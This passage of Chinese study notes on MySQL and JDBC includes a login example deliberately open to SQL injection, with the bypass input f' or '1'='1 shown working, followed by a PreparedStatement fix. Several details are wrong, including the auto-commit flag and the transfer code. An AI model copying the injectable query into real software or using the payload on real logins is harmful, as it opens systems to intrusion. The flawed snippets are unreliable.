by\nasc表示升序，desc表示降序\n[多个排序条件，在多个条件中间逗号隔开即可](Pasted%20image%2020220817092232.png)\n当有where时，必须放在where后面\n\n\n[ifnull()单行处理函数](Pasted%20image%2020220817110624.png)\n\n---\n## 分组函数\n| count | 取得记录数 |\n| ----- | ---------- |\n| sum   | 求和       |\n| avg   | 取平均     |\n| max   | 取最大的数 |\n| min   | 取最小的数 |\n\n\n**注意：分组函数自动忽略空值，不需要手动的加where** **条件排除空值。**\n\t分组函数**不能直接使用在where关键字后面。**\n---\n## 分组查询\n分组查询主要涉及到两个子句，分别是：group by和having\n[示例](Pasted%20image%2020220817160233.png)\n\n如果使用了order by，**order by必须放到group by后面**\n在SQL语句中若有group by 语句，那么在select语句后面只能跟**分组函数** **+参与分组的字段**\n\n\n## 执行顺序\n1.\t首先执行where语句过滤原始数据\n2.\t执行group by进行分组\n3. 执行having对分组数据进行操作\n4.\t执行select选出数据\n5.\t执行order by排序\n\n#书写原则\n能在where中过滤的数据，尽量在where中过滤，效率较高。having的过滤是专门对分组之后的数据进行过滤的。","lastmodified":"2023-05-31T09:03:32.937906837Z","tags":null},"/0004_Statement%E5%92%8CPreparedStatement%E7%9A%84%E5%8C%BA%E5%88%AB":{"title":"0004_Statement和PreparedStatement的区别","content":"# 0004_Statement和PreparedStatement的区别\n1. `Statement`存在SQL注入问题，而`PreparedStatement`解决了SQL注入问题\n2. `Statement`存在安全编译时的类型检查问题，而`PreparedStetement`因为是采用setxxx的方式，可以在编译的时候做安全检查\n3. **`Statement`每次执行都需要编译一次**，**`PreparedStatement`编译一次，执行多次。**\n\t-  `PreparedStatement`因为是先发送给DBMS一个sql语句架子，DMBS进行了编译，然后再通过setxxx进行传值，最后再执行。以后每一次执行，`PreparedStatement`就不会再编译了，传值就可以直接传值执行，所以`PreParedStatement`执行效率更高。 \n\n\n综合：`PreparedStatement`使用较多\n\n\n使用`PreparedStatement`之后传值，值中的特殊符号都会转义，所以避免了sql注入\n```sql\ncom.mysql.jdbc.JDBC4PreparedStatement@5ce81285: select * from t_user where loginName = 'z' and loginPassword = 'z\\' or \\'1\\'=\\'1'\n```\n\n什么时候采用`Statement`，需要用户注入sql语句的时候就需要用到，或者不包括安全问题的时候也可以用，参数不用单引号引起来的也需要用到","lastmodified":"2023-05-31T09:03:32.937906837Z","tags":null},"/0005_%E8%BF%9E%E6%8E%A5":{"title":"0005_连接","content":"# 0005_连接\n\n# 根据连接方式来分类\n1. 内连接：`inner join xxx on   条件`\n   1. 等值连接\n   2. [非等值连接](Pasted%20image%2020220817164507.png)\n   3. [自连接](Pasted%20image%2020220817165250.png)：通过自己来建立连接\n2. 外连接： ` left/right outer join xxx on 条件`  ：主表的所有不满足条件的也会显示出来\n   1. 左外连接（左连接）[示例](Pasted%20image%2020220817182942.png) ： ` left outer join xxx on 条件`  outer可以省略\n   3. 右外连接（右连接）  [示例](Pasted%20image%2020220817183309.png)\n\t示例：[多张表连接查询](Pasted%20image%2020220817193513.png)\n   1. 全连接（这个不讲，很少用！）\n","lastmodified":"2023-05-31T09:03:32.937906837Z","tags":null},"/0005_JDBC%E6%A1%88%E4%BE%8B%E7%BB%99SQL%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%92%E5%85%A5%E6%95%B0%E6%8D%AE":{"title":"0005_JDBC案例：给SQL数据库插入数据","content":"# 0005_JDBC案例：给SQL数据库插入数据\n```java\nimport java.sql.*;  \n  \n  \npublic class JDBCTest01 {  \n    public static void main(String[] args) {  \n        Connection conn=null;//用来建立连接的mysql对象  \n        Statement stmt=null;//用来执行sql语句的对象  \n        try {  \n            // 1.注册驱动  \n            Driver driver = new com.mysql.jdbc.Driver();  \n            DriverManager.registerDriver(driver);  \n            // 2.获取连接  \n            String url = \"jdbc:mysql://127.0.0.1:3306/bjpowernode\";  \n            String user = \"root\";  \n            String password = \"root\";  \n            conn = DriverManager.getConnection(url, user, password);  \n            System.out.println(\"Database connection object------\u003e\" + conn);  \n            //3.获取数据库操作对象（statement专门执行sql语句）  \n            stmt=conn.createStatement();  \n            //4.执行sql  \n            String sql=\"insert into dept(deptno,dname,loc) values(90,'renshibu','Beijing')\";  \n\t\t\t//返回值是影响数据库的记录条数  \n            int count=stmt.executeUpdate(sql);  \n            System.out.println(count==0?\"failure\":\"succeed\");  \n            //处理结果集，因为没有需要处理的，不需要写\n        } catch (SQLException e) {  \n            throw new RuntimeException(e);  \n  \n        }finally {  \n  \n            //6、释放资源  \n            // 为了保证资源一定释放，在finally语句块中关闭资源  \n            // 并且要遵循从小到大依次关闭  \n            // 分别对其try..catch  \n            try {  \n                if (stmt!=null){  \n                    stmt.close();  \n                }  \n            } catch (SQLException e) {  \n                e.printStackTrace();  \n            }  \n  \n            try {  \n                if (conn!=null){  \n                    conn.close();  \n                }  \n            } catch (SQLException e) {  \n                e.printStackTrace();  \n            }  \n        }  \n  \n  \n    }  \n}\n```\noutput\n```shell\nDatabase connection object------\u003ecom.mysql.jdbc.JDBC4Connection@446cdf90\nsucceed\n\nProcess finished with exit code 0\n```","lastmodified":"2023-05-31T09:03:32.937906837Z","tags":null},"/0006_%E9%87%87%E7%94%A8Class.forName%E6%96%B9%E5%BC%8F%E6%B3%A8%E5%86%8C%E9%A9%B1%E5%8A%A8":{"title":"0006_采用`Class.forName`方式注册驱动","content":"# 0006_采用`Class.forName`方式注册驱动\n```java\nimport java.sql.*;  \n  \npublic class JDBCTest03 {  \n    public static void main(String[] args) {  \n        Connection conn=null;  \n        Statement statement=null;  \n        // Driver driver=null;  \n        try {  \n        //    1.注册驱动  \n       /*  //    第一种注册方式  \n            driver=new com.mysql.jdbc.Driver();            DriverManager.registerDriver(driver); */        //    第二种注册方式，不需要返回值，只需要类加载动作,作用是告诉程序我们使用的是哪一个驱动  \n            Class.forName(\"com.mysql.jdbc.Driver\");  \n        //    2.建立连接  \n            String url=\"jdbc:mysql://localhost:3306/bjpowernode\";  \n            String user=\"root\";  \n            String pass=\"root\";  \n            conn=DriverManager.getConnection(url,user,pass);  \n            System.out.println(\"Connection---\u003e\"+conn);  \n        //     发送SQL语句的对象  \n            statement=conn.createStatement();  \n        //    发送sql语句  \n            String sql=\"insert into dept values(133,'人事部','beijing')\";  \n            int count=statement.executeUpdate(sql);  \n            System.out.println(count!=0?\"succeed\":\"failure\");  \n        } catch (SQLException e) {  \n            e.printStackTrace();  \n        } catch (ClassNotFoundException e) {  \n            e.printStackTrace();  \n        } finally {  \n            if (statement!=null){  \n                try {  \n                    statement.close();  \n                } catch (SQLException e) {  \n                    e.printStackTrace();  \n                }  \n            }  \n            if (conn!=null){  \n                try {  \n                    conn.close();  \n                } catch (SQLException e) {  \n                    e.printStackTrace();  \n                }  \n            }  \n        }  \n    }  \n}\n```\n\noutput\n```shell\nDatabase connection object------\u003ecom.mysql.jdbc.JDBC4Connection@446cdf90\nsucceed\n```","lastmodified":"2023-05-31T09:03:32.937906837Z","tags":null},"/0006__%E5%B5%8C%E5%A5%97%E5%AD%90%E6%9F%A5%E8%AF%A2":{"title":"0006__嵌套子查询","content":"# 0006__嵌套子查询\n\n# 嵌套子查询\n## where后面嵌套\n![](Pasted%20image%2020220818092829.png)\n## from后面\n![](Pasted%20image%2020220818094542.png)\n![](Pasted%20image%2020220818094917.png)\n\n## select中使用子查询作为字段\n![](Pasted%20image%2020220818100754.png)","lastmodified":"2023-05-31T09:03:32.937906837Z","tags":null},"/0007_%E9%80%9A%E8%BF%87%E8%B5%84%E6%BA%90%E7%BB%91%E5%AE%9A%E5%99%A8%E8%8E%B7%E5%8F%96%E5%B1%9E%E6%80%A7%E6%96%87%E4%BB%B6":{"title":"0007_通过资源绑定器获取属性文件","content":"# 0007_通过资源绑定器获取属性文件\n```java\nimport java.sql.*;  \nimport java.util.ResourceBundle;  \n  \npublic class JDBCTest04 {  \n    public static void main(String[] args) {  \n    //    通过资源绑定器获取属性文件  \n        ResourceBundle bundle=ResourceBundle.getBundle(\"jdbc\");  \n        String driver=bundle.getString(\"driver\");  \n        String url=bundle.getString(\"url\");  \n        String user=bundle.getString(\"user\");  \n        String password=bundle.getString(\"pass\");  \n        String sql=bundle.getString(\"sql\");  \n  \n        //需要的变量  \n        Connection connection;  \n        Statement statement;  \n        try {  \n        //    1.注册驱动  \n            Class.forName(driver);  \n        //    2.获取连接  \n            connection= DriverManager.getConnection(url,user,password);  \n            System.out.println(\"Connection Object---\u003e\"+connection);  \n        //    发送sql语句的对象  \n            statement=connection.createStatement();  \n        //    发送sql语句  \n            int count=statement.executeUpdate(sql);  \n            System.out.println(count!=0?\"succeed\":\"failure\");  \n        } catch (ClassNotFoundException e) {  \n            e.printStackTrace();  \n        } catch (SQLException e) {  \n            e.printStackTrace();  \n        }  \n    }  \n}\n```\n\n属性文件\n```properties\ndriver=com.mysql.jdbc.Driver  \nurl=jdbc:mysql://localhost:3306/bjpowernode  \nuser=root  \npass=root  \nsql=insert into dept values(165,'???','beijing')\n```\n\noutput\n```shell\nConnection Object---\u003ecom.mysql.jdbc.JDBC4Connection@446cdf90\nsucceed\n```","lastmodified":"2023-05-31T09:03:32.937906837Z","tags":null},"/0007_union":{"title":"0007_union","content":"# 0007_union\n\n![](Pasted%20image%2020220818101325.png)\n合并集合（相加）","lastmodified":"2023-05-31T09:03:32.937906837Z","tags":null},"/0008_%E5%AE%8C%E6%88%90%E7%AC%AC%E4%BA%94%E6%AD%A5%E5%A4%84%E7%90%86%E7%BB%93%E6%9E%9C%E9%9B%86":{"title":"0008_完成第五步，处理结果集","content":"# 0008_完成第五步，处理结果集\n#书写注意点\n在集合中的`resultSet.getInt()`等方法中的参数，select语句中有as的话，填写的是as之后的字段，而不是sql语句中的原有字段名称\n\n```java\nimport java.sql.*;  \n  \npublic class JDBCTest05 {  \n    public static void main(String[] args) {  \n    //    变量预设  \n        Connection connection=null;//连接的对象  \n        Statement statement=null;//发送sql语句的对象  \n        ResultSet resultSet=null;//结果集  \n  \n        try {  \n        //    注册驱动  \n            Class.forName(\"com.mysql.jdbc.Driver\");  \n        //    建立连接  \n            connection= DriverManager.getConnection(\"jdbc:mysql://localhost:3306/bjpowernode\",\"root\",\"root\");  \n        //    获取发送sql语句的对象  \n            statement=connection.createStatement();  \n        //    发送sql语句  \n            resultSet=statement.executeQuery(\"select * from dept\");//专门执行DQL的方法,返回值是ResultSet  \n        //    处理查询集合  \n            while (resultSet.next()){  \n                //getString 可以将数据库中的内容以String的方式获取  \n                //可以使用列数，从1开始，不是从0就开始  \n                int deptno=resultSet.getInt(\"deptno\");  \n                String dname=resultSet.getString(\"dname\");  \n                String loc=resultSet.getString(\"loc\");  \n                System.out.println(deptno+\" \"+dname+\" \"+loc);  \n            }  \n  \n        } catch (ClassNotFoundException e) {  \n            e.printStackTrace();  \n        } catch (SQLException e) {  \n            e.printStackTrace();  \n        }finally {  \n        //    6.释放资源  \n            if (resultSet!=null){  \n                try {  \n                    resultSet.close();  \n                } catch (SQLException e) {  \n                    e.printStackTrace();  \n                }  \n            }  \n            if (statement!=null){  \n                try {  \n                    statement.close();  \n                } catch (SQLException e) {  \n                    e.printStackTrace();  \n                }  \n            }  \n            if (connection!=null){  \n                try {  \n                    connection.close();  \n                } catch (SQLException e) {  \n                    e.printStackTrace();  \n                }  \n            }  \n        }  \n    }  \n}\n```\noutput\n```\n10 ACCOUNTING NEW YORK\n20 RESEARCH DALLAS\n30 SALES CHICAGO\n40 OPERATIONS BOSTON\n50 人事部 北京\n80 renshibu Beijing\n90 renshibu Beijing\n\n```","lastmodified":"2023-05-31T09:03:32.941906873Z","tags":null},"/0008_limit":{"title":"0008_limit","content":"# 0008_limit\n\n\n是sql语句最后执行的一个环节\nlimit m,n\n从第m个开始取，取n个记录\n![](Pasted%20image%2020220818101732.png)\n\nlimit n 取n个记录![](Pasted%20image%2020220818101627.png)","lastmodified":"2023-05-31T09:03:32.937906837Z","tags":null},"/0009_%E6%A1%88%E4%BE%8B%E8%BF%9E%E6%8E%A5%E6%95%B0%E6%8D%AE%E5%BA%93%E9%AA%8C%E8%AF%81%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E5%8F%AF%E8%A2%ABsql%E6%B3%A8%E5%85%A5":{"title":"0009_案例：连接数据库，验证用户登录(可被sql注入）","content":"# 0009_案例：连接数据库，验证用户登录(可被sql注入）\n```java\nimport java.sql.*;  \nimport java.util.HashMap;  \nimport java.util.Map;  \nimport java.util.Scanner;  \n  \npublic class JDBCTest06 {  \n    public static void main(String[] args) {  \n        // 1.初始化用户界面  \n        Map\u003cString, String\u003e userLoginInfo = initUI();// 返回用户名和密码  \n        //2.用户登录，验证用户名和密码  \n        boolean loginSucceed = login(userLoginInfo);  \n  \n        //3.输出结果  \n        System.out.println(loginSucceed?\"登录成功\":\"登录失败\");  \n    }  \n  \n    /**  \n     * @param userLoginInfo 传入的用户信息集合  \n     * @return 返回是否登录成功的结果  \n     */  \n    private static boolean login(Map\u003cString, String\u003e userLoginInfo) {  \n        // 初始化登录结果  \n        boolean loginSucceed = false;  \n        //    获取用户输入的信息  \n        String loginName = userLoginInfo.get(\"loginName\");  \n        String loginPassword = userLoginInfo.get(\"loginPassword\");  \n  \n        // JDBC部分  \n        // 定义基本的连接变量  \n        Connection connection = null;// 建立sql数据库的连接  \n        Statement statement = null;// sql执行语句的发送语句  \n        ResultSet resultSet = null;// 返回结果的集合  \n        try {  \n            // 1.注册驱动  \n            Class.forName(\"com.mysql.jdbc.Driver\");  \n            // 2.获取连接  \n            connection = DriverManager.getConnection(\"jdbc:mysql://localhost:3306/bjpowernode\", \"root\", \"root\");  \n            // 3.创建数据库操作对象  \n            statement = connection.createStatement();  \n            // 4.sql执行语句  \n            String sql = \"select * from t_user where loginName='\" + loginName + \"' and loginPassword='\" + loginPassword + \"'\";  \n            // int count=statement.executeUpdate(sql);//影响的条数，此处无用  \n            resultSet = statement.executeQuery(sql);// 执行slq，并返回结果集  \n            // 5.处理结果集  \n            // 如果有返回的记录，说明数据中存在这样的用户信息，就设置true  \n            if (resultSet.next()) {  \n                loginSucceed = true;  \n            }  \n  \n        } catch (ClassNotFoundException e) {  \n            e.printStackTrace();  \n        } catch (SQLException e) {  \n            e.printStackTrace();  \n        } finally {  \n            // 6释放资源  \n            if (resultSet != null) {  \n                try {  \n                    resultSet.close();  \n                } catch (SQLException e) {  \n                    throw new RuntimeException(e);  \n                }  \n            }  \n  \n            if (statement != null) {  \n                try {  \n                    statement.close();  \n                } catch (SQLException e) {  \n                    e.printStackTrace();  \n                }  \n            }  \n            if (connection != null) {  \n                try {  \n                    connection.close();  \n                } catch (SQLException e) {  \n                    e.printStackTrace();  \n                }  \n            }  \n        }  \n        return loginSucceed;  \n    }  \n  \n    /**  \n     * 初始化用户界面  \n     *  \n     * @return 返回用户账户和密码的map集合  \n     */  \n    private static Map\u003cString, String\u003e initUI() {  \n        // 输入  \n        Scanner s = new Scanner(System.in);  \n        System.out.println(\"请输入用户名：\");  \n        String loginName = s.nextLine();  \n        System.out.println(\"请输入密码\");  \n        String loginPassword = s.nextLine();  \n        // 存放到map集合中  \n        Map\u003cString, String\u003e userLoginInfo = new HashMap\u003c\u003e();  \n        userLoginInfo.put(\"loginName\", loginName);  \n        userLoginInfo.put(\"loginPassword\", loginPassword);  \n        // 返回账户信息集合  \n        return userLoginInfo;  \n    }  \n  \n  \n}\n```\noutput\n```shell\n请输入用户名：\nzhangsan\n请输入密码\n123\n登录成功\n\nProcess finished with exit code 0\n```\n\nsql注入\n```shell\n请输入用户名：\nanyone\n请输入密码\nf' or '1'='1\n登录成功\n\n```\n[[0010 解决sql注入问题的PreparedStatement]]","lastmodified":"2023-05-31T09:03:32.941906873Z","tags":null},"/0009_DML%E6%95%B0%E6%8D%AE%E6%93%8D%E4%BD%9C%E8%AF%AD%E8%A8%80":{"title":"0009_DML（数据操作语言）","content":"# 0009_DML（数据操作语言）\n\n```sql\ncreate table tableName(\n\n   columnName dataType(length),\n\n   ………………..\n\n   columnName dataType(length)\n\n);\n\nset character_set_results='gbk';\n\nshow variables like '%char%';\n\n创建表的时候，表中有字段，每一个字段有：\n\n     * 字段名\n\n     * 字段数据类型\n\n     * 字段长度限制\n\n     * 字段约束\n```\n\n# 表操作\n## 创建表\nchar和varchar怎么选择？\n在实际的开发中，当某个字段中的数据长度不发生改变的时候，是定长的，例如：性别、生日等都是采用chr。当一个字段的数据长度不确定，例如：简介、姓名等都是采用varchar。\n\n### 字段类型\n\n| 类型                         | 描述                                             |\n| ---------------------------- | ------------------------------------------------ |\n| Char(长度)                   | 定长字符串，存储空间大小固定，适合作为主键或外键 |\n| Varchar(长度)                | 变长字符串，存储空间等于实际数据空间             |\n| double(有效数字位数，小数位) | 数值型                                           |\n| Float(有效数字位数，小数位)  | 数值型                                           |\n| Int( 长度)                   | 整型                                             |\n| bigint(长度)                 | 长整型                                           |\n| Date                         | 日期型 年月日                                    |\n| DateTime                     | 日期型 年月日 时分秒 毫秒                        |\n| time                         | 日期型 时分秒                                    |\n| BLOB                         | Binary Large OBject（二进制大对象）              |\n| CLOB                         | Character Large OBject（字符大对象）             |\n| 其它…………………                  |                                                  |                                                  |\n\n\n### eg1\n![](Pasted%20image%2020220818103823.png)\n[navicat图](Pasted%20image%2020220818112743.png)\n\n## 插入数据\n![](Pasted%20image%2020220818114508.png)\n![](Pasted%20image%2020220818114655.png)\n\n[0002 SQL语句的分类](0002%20SQL语句的分类.md \"最好的markdown教程\")\n\ninsert into tablename（字段） values（）；\n\n[一次插入多条数据](Pasted%20image%2020220818130016.png)\n\n## 复制表\n```mysql\ncreate table 新建的表名 as select语句\n```\n![](Pasted%20image%2020220818130930.png)\n\n### 查询结果插入数据到表\n```msyql\ninsert into 表名 select语句\n```\n![](Pasted%20image%2020220818131243.png)\n\n## 修改数据\n```mysql\nupdate 表名 set 字段名=值,字段名=值 where 条件;\n```\n![](Pasted%20image%2020220818131651.png)\n\n## 删除数据\n![](Pasted%20image%2020220818131822.png)\n**删除大表数据**： `truncate table 表名`   表被截断，不可回滚。永久丢失。\n\n## 删除表\n```sql\ndrop table if exists 表名\n```\n\n\n增删改查有一个术语：**CRUD操作**\nCreate（增） Retrieve（检索） Update（修改） Delete（删除）","lastmodified":"2023-05-31T09:03:32.941906873Z","tags":null},"/0010_%E7%BA%A6%E6%9D%9FConstraint":{"title":"0010_约束(Constraint)","content":"# 0010_约束(Constraint)\n\n# 概述\n1. 什么是约束？常见的约束有哪些呢？\n\t1. 在创建表的时候，可以给表的字段添加相应的约束，\n\t2. 添加约束的目的是为了保证表中数据的**合法性**、**有效性**、**完整性**。\n2. 常见的约束有哪些呢？\n\t1. 非空约束(not null)：约束的字段不能为NULL   \n\t2. 唯一约束(unique)：约束的字段不能重复 ** 但可以为NULL **。\n\t3. 主键约束(primary key)：约束的字段既不能为NULL，也不能重复（简称PK）\n\t4. 外键约束(foreign key)：...（简称FK）\n\t5. 检查约束(check)：注意Oracle数据库有check约束，但是mysql没有，目前mysql不支持该约束。\n\n---\n##  实操例子\n### 非空约束eg\n[建表](Pasted%20image%2020220818210147.png) \n[测试](Pasted%20image%2020220818210112.png)\n\n### 唯一约束(unique)eg\n列级约束\n![](Pasted%20image%2020220818210753.png)\n![](Pasted%20image%2020220818210759.png)\n\n表级约束，多个字段\n\n### 主键约束\n字段后面添加`primary key`即可\n![](Pasted%20image%2020220819084456.png)\n\n主键的特点：**不能为NULL，也不能重复**\n\n主键有什么作用？\n- 表的设计三范式中有要求，第一范式就要求任何一张表都应该有主键。\n- 主键的作用：主键值是这行记录在这张表当中的唯一标识。\n\n主键的分类？\n\t根据主键字段的字段数量来划分：\n\t\t单一主键（推荐的，常用的。）\n\t\t复合主键(多个字段联合起来添加一个主键约束)（复合主键不建议使用，因为复合主键违背三范式。）\n\t根据主键性质来划分：\n\t\t自然主键：主键值最好就是一个和业务没有任何关系的自然数。（这种方式是推荐的）\n\t\t业务主键：主键值和系统的业务挂钩，例如：拿着银行卡的卡号做主键，拿着身份证号码作为主键。（不推荐用）\n\t\t\t\t\t  最好不要拿着和业务挂钩的字段作为主键。因为以后的业务一旦发生改变的时候，主键值可能也需要\n\t\t\t\t\t  随着发生变化，但有的时候没有办法变化，因为变化可能会导致主键值重复。\n\t** 一张表的主键约束只能有1个。**\n\n表级约束定义主键\n![](Pasted%20image%2020220819085218.png)\n\n复合主键，**由两个字段组成主键约束**\n![](Pasted%20image%2020220819085350.png)\n\n### 提供的主键自增\n![](Pasted%20image%2020220819085511.png)\n```sql\nprimary key auto_increment\n```\nOracle当中也提供了一个自增机制，叫做：序列（sequence）对象。\n\n### 外键约束\n外键约束` foreign key(classno) references t_class(cno)`\n\n被引用的字段不一定是主键，但至少具有unique约束。\n* 关于外键约束的相关术语：\n\t外键约束: foreign key\n\t外键字段：添加有外键约束的字段\n\t外键值：外键字段中的每一个值。\n顺序要求：\n\t\t\t删除数据的时候，先删除子表，再删除父表。\n\t\t\t添加数据的时候，先添加父表，在添加子表。\n\t\t\t创建表的时候，先创建父表，再创建子表。\n\t\t\t删除表的时候，先删除子表，在删除父表。\n\t\t\t\n![](Pasted%20image%2020220819091853.png)\n创建外键关联\n![](Pasted%20image%2020220819091901.png)  ","lastmodified":"2023-05-31T09:03:32.941906873Z","tags":null},"/0010_%E8%A7%A3%E5%86%B3sql%E6%B3%A8%E5%85%A5%E9%97%AE%E9%A2%98%E7%9A%84PreparedStatement":{"title":"0010_解决sql注入问题的PreparedStatement","content":"# 0010_解决sql注入问题的PreparedStatement\n```java\nimport java.sql.*;  \nimport java.util.HashMap;  \nimport java.util.Map;  \nimport java.util.Scanner;  \n  \npublic class JDBCTest07 {  \n    public static void main(String[] args) {  \n    //1.  初始化界面  \n        Map\u003cString,String\u003e userLoginInfo=initUI();  \n    //2.  验证用户信息  \n        boolean loginSucceed=login(userLoginInfo);  \n    //3.  输出结果信息  \n        System.out.println(loginSucceed?\"登录成功\":\"登录失败\");  \n    }  \n  \n    /**  \n     * 验证用户登录信息  \n     * @param userLoginInfo 用户输入的用户信息  \n     * @return 返回登录的结果  \n     */  \n    private static boolean login(Map\u003cString, String\u003e userLoginInfo) {  \n        //获取用户的登录信息  \n        String loginName=userLoginInfo.get(\"loginName\");  \n        String loginPassword=userLoginInfo.get(\"loginPassword\");  \n        //与sql服务器进行验证  \n        boolean loginSucceed=false;// 登录结果是否成功的标签  \n        Connection connection=null;//连接的对象  \n        PreparedStatement preparedStatement=null;//操作sql数据库的对象，避免sql注入的方式  \n        ResultSet resultSet=null;  \n        try {  \n            // 1.注册驱动  \n            Class.forName(\"com.mysql.jdbc.Driver\");  \n            // 2.获取连接  \n            connection = DriverManager.getConnection(\"jdbc:mysql://localhost:3306/bjpowernode\", \"root\", \"root\");  \n            // 3.创建sql操作对象  \n            String sql=\"select * from t_user where loginName = ? and loginPassword = ?\";  \n            //发送的sql框子给DBMS，DBMS进行sql语句的预编译，  \n            // 之后给？传值即可就不会讲传的值作为编译的一部分，造成sql注入  \n            preparedStatement=connection.prepareStatement(sql);  \n            //设置sql语句中？的值  \n            preparedStatement.setString(1,loginName);  \n            preparedStatement.setString(2,loginPassword);  \n            //执行sql  \n            resultSet=preparedStatement.executeQuery();  \n            if (resultSet.next()){  \n                loginSucceed=true;  \n            }  \n        } catch (ClassNotFoundException e) {  \n            e.printStackTrace();  \n        } catch (SQLException e) {  \n            e.printStackTrace();  \n        }finally {  \n            if (resultSet!=null){  \n                try {  \n                    resultSet.close();  \n                } catch (SQLException e) {  \n                    e.printStackTrace();  \n                }  \n            }  \n            if (preparedStatement!=null){  \n                try {  \n                    preparedStatement.close();  \n                } catch (SQLException e) {  \n                    e.printStackTrace();  \n                }  \n            }  \n            if (connection!=null){  \n                try {  \n                    connection.close();  \n                } catch (SQLException e) {  \n                    e.printStackTrace();  \n                }  \n            }  \n        }  \n        return loginSucceed;  \n    }  \n  \n    /**  \n     * 用户登录的界面  \n     * @return 返回用户填写的登录信息集合  \n     */  \n    private static Map\u003cString, String\u003e initUI() {  \n        Scanner s=new Scanner(System.in);  \n        String loginName,loginPassword;  \n        System.out.println(\"请输入用户名：\");  \n        loginName=s.nextLine();  \n        System.out.println(\"请输入  密码：\");  \n        loginPassword=s.nextLine();  \n  \n        //        放入到集合中  \n        Map\u003cString,String\u003e userLoginInfoSet=new HashMap\u003c\u003e();  \n        userLoginInfoSet.put(\"loginName\",loginName);  \n        userLoginInfoSet.put(\"loginPassword\",loginPassword);  \n        return userLoginInfoSet;  \n    }  \n}\n```\n\n\n为什么这个能够解决注入问题\n[0004 Statement和PreparedStatement的区别](0004%20Statement和PreparedStatement的区别.md)","lastmodified":"2023-05-31T09:03:32.941906873Z","tags":null},"/0011_%E4%BA%8B%E5%8A%A1%E6%9C%BA%E5%88%B6":{"title":"0011_事务机制","content":"# 0011_事务机制\n## 事务机制的作用\nJDBC中默认事务机制是：执行一条，提交一条。\n但是在实际应用开发中，有时候需要多条DML语句共同联合完成或者失败来决定是否提交到数据库，所以就需要事物机制。\n比如：转账，需要两个语句中的转出和转入都要成功，或者总共的钱就会有缺失或者多余\n\n关闭事物提交：`获取连接的对象.setAutoCommit(true);`\n进行提交：`xx.commit();`\n回滚：`xx.rollback();`一般写在异常中，用于DML语句中出现了异常就回滚事务\n\n```java\nimport jdbc.DBUtil;  \n  \nimport java.sql.Connection;  \nimport java.sql.PreparedStatement;  \nimport java.sql.SQLException;  \n  \n/* 关于事务机制 */public class JDBCTest11 {  \n    public static void main(String[] args) {  \n        Connection con = null;  \n        PreparedStatement ps = null;  \n  \n        try {  \n            //1. 注册驱动,以及连接连接,因为在调用的时候，会自动调用dbutil类中的静态代码块，静态代码块中包括了注册驱动的方法  \n            con=DBUtil.getConnection();  \n            //2.获取sql操作对象  \n            //修改自动提交机制  \n  \n            //关闭自动提交，开启事务  \n            con.setAutoCommit(false);  \n        //从一个账户取出1000  \n            String sql=\"update t_act set balance = ? where actno = ?\";  \n            ps=con.prepareStatement(sql);//发送sql语句进行预编译  \n            //传值  \n            ps.setDouble(1,1000);  \n            ps.setInt(2,111);  \n            int count=ps.executeUpdate();//执行sql，并获取影响的条数  \n  \n  \n            // sql=\"update t_act set balance = ? where actno = ?\";  \n            // ps=con.prepareStatement(sql);//发送sql语句进行预编译  \n        //把取出的1000放入到另一个账户  \n            //传值进行查询  \n            ps.setInt(1,1000);  \n            ps.setInt(2,222);  \n            count+=ps.executeUpdate();//执行并返回影响条数  \n            System.out.println(count==2?\"转账成功\":\"转账失败\");  \n            // System.out.println(count);  \n        //    提交事务  \n            con.commit();  \n        } catch (Exception e) {  \n            //如果执行过程中出现了异常，就回滚事务  \n            if (con!=null){  \n                try {  \n                    con.rollback();  \n                } catch (SQLException ex) {  \n                    e.printStackTrace();  \n                }  \n            }  \n            e.printStackTrace();  \n        }finally {  \n        //    释放资源  \n  \n            if (ps!=null){  \n                try {  \n                    ps.close();  \n                } catch (SQLException e) {  \n                    e.printStackTrace();  \n                }  \n            }  \n            DBUtil.close(con,null,null);  \n        }  \n    }  \n}\n```","lastmodified":"2023-05-31T09:03:32.941906873Z","tags":null},"/0011_%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E":{"title":"0011_存储引擎","content":"# 0011_存储引擎\n\n完整的建表语句\n```sql\nCREATE TABLE `t_x` (\n  `id` int(11) DEFAULT NULL\n) ENGINE=InnoDB DEFAULT CHARSET=utf8;\n```\n\nmysql默认使用的存储引擎是InnoDB方式。\n\t\t默认采用的字符集是UTF8\n\n\n什么是存储引擎呢？\n1. 存储引擎这个名字只有在mysql中存在。（Oracle中有对应的机制，但是不叫做存储引擎。Oracle中没有特殊的名字，就是“表的存储方式”）\n2. mysql支持很多存储引擎，每一个存储引擎都对应了一种不同的存储方式。\n\t每一个存储引擎都有自己的优缺点，需要在合适的时机选择合适的存储引擎。\n\n\n查看当前mysql支持的存储引擎？\n\t\t[show engines \\G](Pasted%20image%2020220819092322.png)\n\n\n### 常见的存储引擎\n常见的存储引擎？\n\n\u003e[!faq]- MyISAM\n\u003e Engine: MyISAM\n\u003e\t  Support: YES\n\u003e\t  Comment: MyISAM storage engine\n\u003eTransactions: NO\n\u003e\t\t\t XA: NO\n  \u003eSavepoints: NO\n\u003e\n\u003eMyISAM这种存储引擎不支持事务。\n\u003eMyISAM是mysql最常用的存储引擎，但是这种引擎不是默认的。\n\u003eMyISAM采用三个文件组织一张表：\n\t\u003exxx.frm（存储格式的文件）\n\t\u003exxx.MYD（存储表中数据的文件）\n\t\u003exxx.MYI（存储表中索引的文件）\n\u003e优点：可被压缩，节省存储空间。并且可以转换为只读表，提高检索效率。\n\u003e缺点：不支持事务。\n\n\n\u003e[!faq]- InnoDB\n\u003e\t\t  Engine: InnoDB\n\u003e\t\t  Support: DEFAULT\n\u003e\t\t  Comment: Supports transactions, row-level locking, and foreign keys\n\u003e\tTransactions: YES\n\u003e\t\t\t\t XA: YES\n\u003e\t  Savepoints: YES\n\u003e\t\t\n\u003e\t优点：支持事务、行级锁、外键等。这种存储引擎数据的安全得到保障。\n\u003e\t\n\u003e\t表的结构存储在xxx.frm文件中\n\u003e\t数据存储在tablespace这样的表空间中（逻辑概念），无法被压缩，无法转换成只读。\n\u003e\t这种InnoDB存储引擎在MySQL数据库崩溃之后提供自动恢复机制。\n\u003e\tInnoDB支持级联删除和级联更新。\n\n\n\u003e[!faq]- MEMORY\n\u003e\t\t\tEngine: MEMORY\n\u003e\t\t  Support: YES\n\u003e\t\t  Comment: Hash based, stored in memory, useful for temporary tables\n\u003e\tTransactions: NO\n\u003e\t\t\t\t XA: NO\n\u003e\t  Savepoints: 